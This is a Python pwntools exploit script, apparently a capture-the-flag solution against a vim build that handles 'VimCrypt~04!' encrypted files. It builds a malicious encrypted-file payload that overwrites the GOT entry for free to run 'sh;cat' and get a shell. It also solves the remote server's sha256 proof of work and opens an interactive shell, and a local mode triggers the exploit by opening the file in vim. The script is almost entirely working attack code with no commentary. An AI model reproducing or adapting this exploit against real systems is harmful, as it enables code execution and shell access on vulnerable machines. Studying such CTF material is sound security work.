from pwn import *
import sys, time
import hashlib
import random
import os

elf = ELF("./vim")
head = "VimCrypt~04!"
convert = lambda x : x ^ 0x61

datav = p32(convert(0xffffffff))[::-1] + ("".ljust(0x9c, "A") + p64(0x4C915D)[::-1] * 3 + "sh;cat;bs\x00aa"[::-1].ljust(0x20, "A") + (p64(elf.got['free'] - 0x14)[::-1]) * 0x1).ljust(0x100, "C")

if len(sys.argv) == 2:
    p = remote("111.186.63.13", "10001")

    p.recvuntil("sha256(XXXX+")
    data = p.recvuntil(")")[:-1]
    p.recvuntil("== ")
    t = p.recvuntil("\n")[:-1]

    proof = ""
    while True:
        proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in xrange(4)])
        digest = hashlib.sha256(proof + data).hexdigest()
        if digest == t:
            break

    p.sendline(proof)
    print("Done")
    p.sendlineafter("OK", head + datav)
    print("Send Payload")
    p.interactive()



else:
    os.system("rm ./.test.swp")
    f = open("./test", "wb")
    f.write(head + datav)
    f.close()

    os.system('echo ":q" | ./vim --clean ./test')
    os.system("rm ./.test.swp")
